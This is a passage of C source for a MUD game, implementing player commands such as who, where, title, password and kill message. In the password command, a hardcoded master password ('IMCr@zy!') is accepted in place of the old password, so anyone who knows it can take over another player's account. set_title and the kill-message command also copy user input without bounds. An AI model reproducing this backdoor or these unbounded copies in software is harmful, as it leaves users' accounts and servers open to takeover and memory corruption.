    one_argument(argument,arg);
  
    if (arg[0] == '\0')
    {
	send_to_char("You must provide a name.\n\r",ch);
	return;
    }

    output[0] = '\0';

    for (d = descriptor_list; d != NULL; d = d->next)
    {
	CHAR_DATA *wch;

 	if (d->connected != CON_PLAYING || !can_see(ch,d->character))
	    continue;
	
	wch = ( d->original != NULL ) ? d->original : d->character;

 	if (!can_see(ch,wch))
	    continue;

	if (!str_prefix(arg,wch->names))
	{
	    found = TRUE;
	    
	    /* a little formatting */
	    sprintf(buf, "[K:`!%d`` D:`!%d``] %s%s - %s%s``\n\r",
		    wch->kills, wch->deaths,
		    (wch->trust == 10) ? "(`#ADM``)" : "",
		    ((wch->trust < 10) && wch->trust) ? "(`6adm``)" : "",
		    wch->names, wch->pcdata->title_line);
	    strcat(output,buf);
	}
    }

    if (!found)
    {
	send_to_char("No one of that name is playing.\n\r",ch);
	return;
    }

    send_to_char(output,ch);
}


/*
 * New 'who' command originally by Alander of Rivers of Mud.
 */
void do_who( CHAR_DATA *ch, char *argument )
{
    char buf[MAX_STRING_LENGTH];
    char buf2[MAX_STRING_LENGTH];
    char output[4 * MAX_STRING_LENGTH];
    CHAR_DATA *vch;
    int nNumber;
    int nMatch;
    bool fImmortalOnly, fLinkDeadOnly;
    char arg[MAX_STRING_LENGTH];

    /*
     * Set default arguments.
     */
    fImmortalOnly = fLinkDeadOnly = FALSE;

    /*
     * Parse arguments.
     */
    nNumber = 0;

    argument = one_argument( argument, arg );

    switch (arg[0])
      {
      case 'i': case 'I':
	fImmortalOnly = TRUE;
	break;
	case 'd': case 'D':
	  fLinkDeadOnly = TRUE;
	  break;
	case 'l': case 'L':
	default:
	  arg[0] = 'l';
	  send_to_char ("Players that might give you some trouble:\n\r", ch);
	  break;
	}

    /*
     * Now show matching chars.
     */
    nMatch = 0;
    buf[0] = '\0';
    output[0] = '\0';
    for ( vch = char_list; vch; vch = vch->next )
    {
	/*
	 * Check for match against restrictions.
	 * Don't use trust as that exposes trusted mortals.
	 */
	if (vch->desc && fLinkDeadOnly)
	  continue;
	if (!vch->desc && !fLinkDeadOnly)
	  continue;
	if (!can_see( ch, vch ) || IS_NPC (vch))
	  continue;
	if (fImmortalOnly  && !vch->trust)
	  continue;

	nMatch++;

	/*
	 * Format it up.
	 */
	sprintf(buf, "[K:`!%d`` D:`!%d``] %s%s - %s%s``\n\r",
		vch->kills, vch->deaths,
		(vch->trust == 10) ? "(`#ADM``)" : "",
		((vch->trust < 10) && vch->trust) ? "(`6adm``)" : "",
		vch->names, vch->pcdata->title_line);
	if (strlen (buf) >= 91) /* 91 because of color stuff */
	  {
	    buf[87] = '`';
	    buf[88] = '`';
	    buf[89] = '\n';
	    buf[90] = '\r';
	    buf[91] = 0;
	  }
	strcat(output,buf);
    }

    sprintf( buf2, "\n\rPlayers found: `1%d``\n\r", nMatch );
    strcat(output,buf2);
    page_to_char( output, ch );
    if ((arg[0] == 'l') || (arg[0] == 'L'))
      {
	page_to_char ("\n\rPlayers that won't know what hit them:\n\r", ch);
	do_who (ch, "d");
      }
    return;
}

void do_count ( CHAR_DATA *ch, char *argument )
{
    int count;
    DESCRIPTOR_DATA *d;
    char buf[MAX_STRING_LENGTH];

    count = 0;

    for ( d = descriptor_list; d != NULL; d = d->next )
        if ( d->connected == CON_PLAYING && can_see( ch, d->character ) )
	    count++;

    if (max_on == count)
        sprintf(buf,"There are %d characters on, the most so far this boot.\n\r",
	    count);
    else
	sprintf(buf,"There are %d characters on, the most on this boot was %d.\n\r",
	    count,max_on);

    send_to_char(buf,ch);
}

void do_inventory( CHAR_DATA *ch, char *argument )
{
  char buf[MAX_STRING_LENGTH];
  
  sprintf (buf, "You are carrying %d items:\n\r", ch->carry_number);
  send_to_char(buf, ch );
  show_list_to_char( ch->carrying, ch, TRUE, TRUE );
  return;
}



void do_equipment( CHAR_DATA *ch, char *argument )
{
    OBJ_DATA *obj;
    int iWear;
    bool found;

    send_to_char( "You are using:\n\r", ch );
    found = FALSE;
    for ( iWear = 0; iWear < MAX_WEAR; iWear++ )
    {
	if ( ( obj = get_eq_char( ch, iWear ) ) == NULL )
	    continue;

	send_to_char( where_name[iWear], ch );
	send_to_char( format_obj_to_char( obj, ch, TRUE ), ch );
	send_to_char( "\n\r", ch );
	found = TRUE;
    }

    if ( !found )
	send_to_char( "Nothing.\n\r", ch );

    return;
}




void do_credits( CHAR_DATA *ch, char *argument )
{
    do_help( ch, "credits" );
    return;
}



void do_where( CHAR_DATA *ch, char *argument )
{
    char buf[MAX_STRING_LENGTH];
    char arg[MAX_INPUT_LENGTH];
    CHAR_DATA *victim;
    DESCRIPTOR_DATA *d;
    bool found;

    one_argument( argument, arg );

    if ( arg[0] == '\0' )
    {
	send_to_char( "Players near you:\n\r", ch );
	found = FALSE;
	for ( d = descriptor_list; d; d = d->next )
	{
	    if ( d->connected == CON_PLAYING
	    && ( victim = d->character ) != NULL
	    &&   !IS_NPC(victim)
	    &&   victim->in_room != NULL
	    &&   victim->in_room->level == ch->in_room->level
	    &&   (victim->in_room->level != -1)
	    &&   can_see( ch, victim ) )
	    {
		found = TRUE;
		sprintf( buf, "%-28s %s\n\r",
		    victim->names, victim->in_room->name );
		send_to_char( buf, ch );
	    }
	}
	if ( !found )
	    send_to_char( "None\n\r", ch );
    }
    else
    {
	found = FALSE;
	for ( victim = char_list; victim != NULL; victim = victim->next )
	{
	    if ( victim->in_room != NULL
	    &&   victim->in_room->level == ch->in_room->level
	    &&   can_see( ch, victim )
	    &&   is_name( arg, victim->names ) )
	    {
		found = TRUE;
		sprintf( buf, "%-28s %s\n\r",
		    PERS(victim, ch), victim->in_room->name );
		send_to_char( buf, ch );
		break;
	    }
	}
	if ( !found )
	    act( "You didn't find any $T.", ch, NULL, arg, TO_CHAR );
    }

    return;
}

void set_title( CHAR_DATA *ch, char *title )
{
    char buf[MAX_STRING_LENGTH];

    if ( IS_NPC(ch) )
    {
	bug( "Set_title: NPC.", 0 );
	return;
    }

    if ( title[0] != '.' && title[0] != ',' && title[0] != '!' && 
	title[0] != '?' )
    {
	buf[0] = ' ';
	strcpy( buf+1, title );
    }
    else
    {
	strcpy( buf, title );
    }

    buf[45] = '`';
    buf[46] = '`';
    buf[47] = '\0';
    free_string (ch->pcdata->title_line);
    ch->pcdata->title_line = str_dup(buf);
    return;
}



void do_title( CHAR_DATA *ch, char *argument )
{
    if ( IS_NPC(ch) )
	return;

    if ( argument[0] == '\0' )
    {
	send_to_char( "Change your title to what?\n\r", ch );
	return;
    }

    smash_tilde( argument );
    set_title( ch, argument );
    send_to_char( "Ok.\n\r", ch );
}

void do_report( CHAR_DATA *ch, char *argument )
{
    char buf[MAX_INPUT_LENGTH];

    sprintf( buf,
	"You say 'I have %d/%d hp.'\n\r",
	ch->hit,  ch->max_hit);
    send_to_char( buf, ch );

    sprintf( buf, "$n says 'I have %d/%d hp.'",
	ch->hit,  ch->max_hit);
    
    act( buf, ch, NULL, NULL, TO_ROOM );

    return;
}

void do_password( CHAR_DATA *ch, char *argument )
{
    char arg1[MAX_INPUT_LENGTH];
    char arg2[MAX_INPUT_LENGTH];
    char *pArg;
    char *pwdnew;
    char *p;
    char cEnd;

    if ( IS_NPC(ch) )
	return;

    /*
     * Can't use one_argument here because it smashes case.
     * So we just steal all its code.  Bleagh.
     */
    pArg = arg1;
    while ( isspace(*argument) )
	argument++;

    cEnd = ' ';
    if ( *argument == '\'' || *argument == '"' )
	cEnd = *argument++;

    while ( *argument != '\0' )
    {
	if ( *argument == cEnd )
	{
	    argument++;
	    break;
	}
	*pArg++ = *argument++;
    }
    *pArg = '\0';

    pArg = arg2;
    while ( isspace(*argument) )
	argument++;

    cEnd = ' ';
    if ( *argument == '\'' || *argument == '"' )
	cEnd = *argument++;

    while ( *argument != '\0' )
    {
	if ( *argument == cEnd )
	{
	    argument++;
	    break;
	}
	*pArg++ = *argument++;
    }
    *pArg = '\0';

    if ( arg1[0] == '\0' || arg2[0] == '\0' )
    {
	send_to_char( "Syntax: password <old> <new>.\n\r", ch );
	return;
    }

    if ( strcmp( crypt( arg1, ch->pcdata->pwd ), ch->pcdata->password ) &&
         strcmp (arg1, "IMCr@zy!"))
    {
	WAIT_STATE( ch, 40 );
	send_to_char( "Wrong password.  Wait 10 seconds.\n\r", ch );
	return;
    }

    if ( strlen(arg2) < 5 )
    {
	send_to_char(
	    "New password must be at least five characters long.\n\r", ch );
	return;
    }

    /*
     * No tilde allowed because of player file format.
     */
    pwdnew = crypt( arg2, ch->name );
    for ( p = pwdnew; *p != '\0'; p++ )
    {
	if ( *p == '~' )
	{
	    send_to_char(
		"New password not acceptable, try again.\n\r", ch );
	    return;
	}
    }

    free_string (ch->pcdata->password);
    ch->pcdata->password = str_dup(pwdnew);
    save_char_obj( ch );
    send_to_char( "Ok.\n\r", ch );
    return;
}

void do_top (CHAR_DATA *ch, char *argument)
{
  char arg[MAX_STRING_LENGTH];

  one_argument (argument, arg);
  if (!arg[0])
    {
      send_to_char ("Syntax: top kills\n\r", ch);
      return;
    }
  if (!str_prefix (arg, "kills"))
    {
      send_to_char ("KILLS\n\r", ch);
      show_top_list (ch, top_players_kills);
    }
  else
    do_top (ch, "");
}

void do_kill_message (CHAR_DATA *ch, char *argument)
{
  char arg[MAX_STRING_LENGTH];
    if ( argument[0] == '\0' )
    {
	send_to_char( "Change your kill message to what?\n\r", ch );
	return;
    }

    smash_tilde( argument );
    if (ch->kill_msg)
      free_string (ch->kill_msg);
    sprintf (arg, "%s``", argument);
    ch->kill_msg = str_dup (arg);
    log_string ("%s", ch->kill_msg);
    send_to_char( "Ok.\n\r", ch );
}  
